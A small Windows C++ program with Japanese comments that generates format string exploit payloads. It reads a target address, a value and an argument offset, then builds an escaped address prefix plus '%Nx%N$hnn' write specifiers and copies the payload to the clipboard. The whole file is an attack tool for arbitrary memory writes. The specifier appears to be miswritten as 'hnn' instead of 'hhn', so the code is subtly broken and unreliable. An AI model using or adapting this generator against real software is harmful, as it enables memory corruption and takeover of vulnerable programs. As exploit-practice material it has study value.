// ConsoleApplication5.cpp : コンソール アプリケーションのエントリ ポイントを定義します。
//
#include "stdafx.h"
#include <windows.h>
#pragma warning(disable:4996)

/*コピペ*/
BOOL SetClipboardText(const char *Str)
{
	int    BufSize;
	char  *Buf;
	HANDLE hMem;

	BufSize = strlen(Str) + 1;                               // 確保するメモリのサイズを計算する
	hMem = GlobalAlloc(GMEM_SHARE | GMEM_MOVEABLE, BufSize); // 移動可能な共有メモリを確保する
	if (!hMem) return FALSE;

	Buf = (char *)GlobalLock(hMem); // 確保したメモリをロックし，アクセス可能にする
	if (Buf)
	{
		strcpy(Buf, Str);   // 文字列を複写する
		GlobalUnlock(hMem); // メモリのロックを解除する
		if (OpenClipboard(NULL))
		{
			EmptyClipboard();                  // クリップボード内の古いデータを解放する
			SetClipboardData(CF_TEXT, hMem); // クリップボードに新しいデータを入力する
			CloseClipboard();

			return TRUE;
		}
	}
	return FALSE;
}

void main()
{
	while (TRUE){
		int d, x, f;
		int p, rest, size = 0;
		char buf[256] = "", str[256] = "";
		printf("\n書き込み先　書き込む値 引数オフセット\n");
		scanf("%p%p%p", &d, &x, &f);
		for (int c = 0; 4 > c; c++){
			for (int i = 0; 4 > i; i++){
				sprintf(str, "\\x%02x", *(byte*)((DWORD)&d + i));
				strcat(buf, str);
			}
			d++;
		}
		for (int i = 0; 4 > i; i++, f++){
			if (!i)sprintf(str, "%%%dx%%%d$hnn", (*(byte*)((DWORD)&x + i) - 16), f);
			else sprintf(str, "%%%dx%%%d$hnn", *(byte*)((DWORD)&x + i) + 0x100 - *(byte*)((DWORD)&x + (i - 1)) - 1, f);
			strcat(buf, str);

		}
		SetClipboardText(buf);
		printf("%s", buf);
	}
}

